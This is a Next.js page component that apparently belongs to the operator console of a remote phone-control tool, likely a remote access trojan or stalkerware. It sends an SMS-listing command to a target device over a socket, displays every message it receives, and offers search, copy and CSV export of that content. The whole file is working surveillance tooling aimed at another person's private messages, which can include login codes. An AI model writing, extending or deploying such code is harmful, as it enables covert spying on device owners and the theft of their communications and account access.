'use client';

import { useState, useEffect, useMemo } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
import { exportToCSV } from '@/lib/utils';
import { MessageSquare, ArrowLeft, Download, RefreshCw, Search, X, Copy, Check, ChevronRight } from 'lucide-react';

interface SMS {
    id: string;
    phoneNo: string;
    msg: string;
}

export default function SmsPage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showTimeout, showConnection } = useNotification();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [smsList, setSmsList] = useState<SMS[]>([]);
    const [isLoading, setIsLoading] = useState(false);
    const [searchQuery, setSearchQuery] = useState('');
    const [selectedSms, setSelectedSms] = useState<SMS | null>(null);
    const [copied, setCopied] = useState(false);

    useEffect(() => {
        initSocket(deviceId);
        showConnection(true, 'Connected to device');

        onResult((data: SocketResult) => {
            let smsArray = null;

            if (data.smsList) {
                if (Array.isArray(data.smsList)) {
                    smsArray = data.smsList;
                } else if ((data.smsList as any).smsList) {
                    smsArray = (data.smsList as any).smsList;
                }
            }

            if (smsArray && Array.isArray(smsArray)) {
                const processed = smsArray.map((sms, idx) => ({
                    id: `${idx}-${sms.phoneNo}-${Date.now()}`,
                    phoneNo: String(sms.phoneNo || 'Unknown'),
                    msg: String(sms.msg || ''),
                }));
                setSmsList(processed);
                setIsLoading(false);
                showSuccess('SMS List Updated', `Loaded ${processed.length} messages`);
            }
        });

        return () => disconnectSocket();
    }, [deviceId]);

    const handleRefresh = () => {
        setIsLoading(true);
        setSearchQuery('');
        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.SMS, extra: 'ls' },
        });

        setTimeout(() => {
            if (isLoading) {
                setIsLoading(false);
                showTimeout('Request Timeout', 'Server took too long to respond', handleRefresh);
            }
        }, 60000);
    };

    const handleExport = () => {
        if (smsList.length === 0) {
            showError('No Data', 'No messages to export');
            return;
        }

        exportToCSV(
            smsList,
            ['Phone Number', 'Message'],
            ['phoneNo', 'msg'],
            `SMS_${new Date().toISOString().split('T')[0]}.csv`
        );
        showSuccess('Exported', 'Messages saved as CSV');
    };

    const handleCopy = async (text: string) => {
        await navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const filteredSms = useMemo(() => {
        if (!searchQuery) return smsList;
        const q = searchQuery.toLowerCase();
        return smsList.filter(s =>
            s.phoneNo.toLowerCase().includes(q) || s.msg.toLowerCase().includes(q)
        );
    }, [smsList, searchQuery]);

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button onClick={() => router.back()} className="p-2 rounded-xl bg-purple-500/15">
                                <ArrowLeft className="w-5 h-5 text-purple-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">SMS Messages</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <button onClick={handleExport} className="p-3 rounded-full bg-white/10">
                            <Download className="w-5 h-5 text-white" />
                        </button>
                    </div>
                </div>
            </div>

            {/* Stats Card */}
            <div className="p-0.5 rounded-2xl mb-6" style={{ background: 'linear-gradient(135deg, #10b981, #059669)' }}>
                <div className="bg-[#1a0b2e] rounded-[0.875rem] p-5 flex items-center gap-4">
                    <MessageSquare className="w-6 h-6 text-white" />
                    <div>
                        <p className="text-3xl font-bold text-white">{smsList.length}</p>
                        <p className="text-gray-400 text-sm">Total Messages</p>
                    </div>
                </div>
            </div>

            {/* Search */}
            {smsList.length > 0 && (
                <div className="ms-card flex items-center gap-3 px-4 py-3 mb-4">
                    <Search className="w-5 h-5 text-gray-500" />
                    <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Search messages..."
                        className="flex-1 bg-transparent text-white outline-none"
                    />
                    {searchQuery && (
                        <button onClick={() => setSearchQuery('')}>
                            <X className="w-5 h-5 text-gray-500" />
                        </button>
                    )}
                </div>
            )}

            {/* Refresh Button */}
            <button
                onClick={handleRefresh}
                disabled={isLoading}
                className={`w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-3 mb-6 ${isLoading
                        ? 'bg-gray-600 text-gray-300'
                        : 'gradient-primary text-white'
                    }`}
            >
                <RefreshCw className={`w-5 h-5 ${isLoading ? 'animate-spin' : ''}`} />
                {isLoading ? 'Loading...' : 'Refresh SMS'}
            </button>

            {/* SMS List */}
            {filteredSms.length === 0 && smsList.length === 0 ? (
                <div className="text-center py-16">
                    <MessageSquare className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                    <p className="text-white font-semibold mb-1">No messages available</p>
                    <p className="text-gray-400 text-sm">Tap refresh to load SMS</p>
                </div>
            ) : filteredSms.length === 0 ? (
                <div className="text-center py-16">
                    <Search className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                    <p className="text-white font-semibold mb-1">No results found</p>
                    <p className="text-gray-400 text-sm">Try a different search term</p>
                </div>
            ) : (
                <div className="space-y-3">
                    {filteredSms.map((sms) => (
                        <button
                            key={sms.id}
                            onClick={() => setSelectedSms(sms)}
                            className="w-full ms-card p-4 flex items-start gap-4 text-left hover:border-purple-500/40 transition-colors"
                        >
                            <div className="w-12 h-12 rounded-full flex-shrink-0 flex items-center justify-center" style={{ background: 'linear-gradient(135deg, #10b981, #059669)' }}>
                                <MessageSquare className="w-5 h-5 text-white" />
                            </div>
                            <div className="flex-1 min-w-0">
                                <div className="flex items-center justify-between mb-2">
                                    <p className="font-semibold text-white truncate">{sms.phoneNo}</p>
                                    <ChevronRight className="w-4 h-4 text-gray-500" />
                                </div>
                                <p className="text-gray-400 text-sm line-clamp-2">{sms.msg}</p>
                            </div>
                        </button>
                    ))}
                    <p className="text-center text-gray-400 text-sm py-4">
                        Showing {filteredSms.length} of {smsList.length} messages
                    </p>
                </div>
            )}

            {/* SMS Detail Modal */}
            {selectedSms && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
                    <div className="w-full max-w-md ms-card overflow-hidden animate-slide-up">
                        {/* Header */}
                        <div className="p-5 flex items-center gap-4" style={{ background: 'linear-gradient(135deg, #10b981, #059669)' }}>
                            <div className="w-12 h-12 rounded-full bg-white/20 flex items-center justify-center">
                                <MessageSquare className="w-6 h-6 text-white" />
                            </div>
                            <div className="flex-1 min-w-0">
                                <p className="font-bold text-white truncate">{selectedSms.phoneNo}</p>
                                <p className="text-white/80 text-sm">SMS Message</p>
                            </div>
                            <button
                                onClick={() => setSelectedSms(null)}
                                className="p-2 rounded-full bg-white/20"
                            >
                                <X className="w-5 h-5 text-white" />
                            </button>
                        </div>

                        {/* Content */}
                        <div className="p-5">
                            <p className="text-purple-300 text-sm font-semibold mb-3">Message Content</p>
                            <div className="p-4 rounded-xl bg-[#2d1b4e] border border-purple-500/20">
                                <p className="text-gray-200 whitespace-pre-wrap break-words">{selectedSms.msg}</p>
                            </div>

                            {/* Actions */}
                            <div className="grid grid-cols-2 gap-3 mt-5">
                                <button
                                    onClick={() => handleCopy(selectedSms.msg)}
                                    className={`py-3 rounded-xl font-semibold flex items-center justify-center gap-2 ${copied
                                            ? 'bg-emerald-500 text-white'
                                            : 'bg-blue-500 text-white'
                                        }`}
                                >
                                    {copied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                                    {copied ? 'Copied!' : 'Copy'}
                                </button>
                                <button
                                    onClick={() => setSelectedSms(null)}
                                    className="py-3 rounded-xl font-semibold flex items-center justify-center gap-2 gradient-primary text-white"
                                >
                                    <Check className="w-5 h-5" />
                                    Done
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
